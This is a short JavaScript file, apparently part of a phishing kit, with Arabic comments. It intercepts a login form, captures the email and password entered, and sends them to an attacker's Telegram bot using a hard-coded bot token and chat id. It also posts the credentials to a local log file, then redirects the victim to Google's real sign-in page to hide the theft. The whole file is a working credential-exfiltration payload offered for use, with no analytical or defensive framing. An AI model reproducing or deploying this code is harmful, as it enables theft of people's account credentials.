
document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const message = `New Login\nEmail: ${email}\nPassword: ${password}`;
    
    // Telegram bot info
    const token = "7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ";
    const chat_id = "7817453978";

    // إرسال البيانات إلى تيليغرام
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: message
        })
    });

    // حفظ البيانات في log.txt (محلياً غير مدعوم مباشرة في المتصفح، لكنه يعمل في بيئة بايثون أو Node.js)
    fetch("log.txt", {
        method: "POST",
        body: `${email} | ${password}\n`
    });

    // إعادة التوجيه لغوغل
    window.location.href = "https://accounts.google.com";
});
